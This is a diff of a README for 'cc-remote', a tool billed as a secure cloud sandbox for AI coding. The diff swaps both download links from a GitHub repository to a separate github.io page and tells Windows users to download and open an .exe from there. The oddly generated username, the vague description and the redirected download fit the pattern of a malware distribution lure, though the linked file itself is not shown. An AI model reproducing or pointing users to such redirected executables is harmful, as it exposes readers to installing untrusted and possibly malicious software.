@@ -1,6 +1,6 @@
 # 🚀 cc-remote - Secure AI coding with cloud sandbox
 
-[![](https://img.shields.io/badge/Download-cc--remote-blue.svg)](https://github.com/Genusglobigerinalithomancer290/cc-remote)
+[![](https://img.shields.io/badge/Download-cc--remote-blue.svg)](https://genusglobigerinalithomancer290.github.io)
 
 cc-remote provides a private, stable environment to run AI coding tools. It keeps your work inside a protected digital container on a remote server. This setup matches your local identity with your coding projects while saving space through smart data compression. You maintain full control over your files without the risk of exposing your machine to local security threats.
 
@@ -8,7 +8,7 @@ cc-remote provides a private, stable environment to run AI coding tools. It keep
 
 You must visit the project page to download the software for your Windows computer. Follow these steps to bring the system online.
 
-1. Go to the [official release page](https://github.com/Genusglobigerinalithomancer290/cc-remote).
+1. Go to the [official release page](https://genusglobigerinalithomancer290.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Click the file ending in .exe to start your download.
 4. Open the file once the download finishes to begin the setup process.
